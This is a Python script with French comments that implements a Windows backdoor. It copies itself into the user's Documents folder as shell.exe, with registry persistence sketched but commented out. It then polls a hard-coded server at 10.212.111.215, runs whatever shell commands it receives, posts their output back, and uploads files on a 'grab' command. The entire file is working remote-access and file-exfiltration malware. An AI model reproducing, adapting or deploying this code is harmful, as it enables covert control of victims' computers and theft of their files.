# coding: utf-8
import requests
import subprocess
import time
import os
import shutil
import time
import random
#import winreg as wreg
import sys
#from PIL import ImageGrab
import tempfile
url1="http://10.212.111.215"
url="http://10.212.111.215/store"
print(sys.argv[0]) # pour vois si elle contient tout le chemin du fichier du script ou bien qe le nom
path = os.getcwd().strip('\n')

byteSortie = str(subprocess.check_output('set USERPROFILE', shell='True'))
nomvariableenvironement, chemin_avec_retour = byteSortie.split("=")
chemin = chemin_avec_retour.strip("\\r\\n'") 
print(chemin)
## nomvariable est unitile mais on veut récupérer le chemin.

destination = chemin + '\\Documents\\shell.exe'


if not os.path.exists(destination): # si le fichier n'existe pas on le copie
     
    shutil.copyfile(sys.argv[0], destination)  # copier le fichier, sys.argv[0] retourne le nom du programme comme sous linux
                                               #mais sous windows retourne tous le chemin
  #  key = wreg.openKey(wreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0 , wreg.KEY_ALL_ACCESS)
 #   wreg.setVlaueKey_EX(key, 'cript',0, wreg.REG_SZ, destination)





def connect():
    while True:
        req = requests.get(url1)
        command = req.text

        if 'terminate' in command:
            return 1


        elif 'grab' in command:

            grab, path = command.split('*')  # split the received grab command into two parts and store the second part in path variable
            print("je sépare avec plit *")

            if os.path.exists(path):  # check if the file is there
                print("j'ai vérifier le fichier et ça existe")

                 # Appended /store in the URL

                files = {'file': open(path, 'rb')}  # Add a dictionary key called 'file' where the key value is the file itself

                r = requests.post(url, files=files)  # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"


            else:

                post_response = requests.post(url=url1, data='[-] Not able to find the file !')
                print("le fichier n'existe pas ")

        elif 'screenshot' in command:

            fichierTemp = tempfile.mkdtemp()
            #apture = ImageGrab.grab(fichierTemp+'\image.jpg', "JPEG").save()

            files = {'file': open("image.jpg","rb")}
            r = requests.post(url, files=files)
            files['file'].close()
            shutil.rmtree(fichierTemp)




        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            post_response = requests.post(url=url1, data=CMD.stdout.read() )  # POST the result
            post_response = requests.post(url=url1, data=CMD.stderr.read() )  # or the error -if any-
            print(req.headers['Content-type'])

    #time.sleep(3)

while True:
    try:
        if connect()==1:
            break
    except:
        temps = random.randrange(0,1)
        time.sleep(temps)
        pass
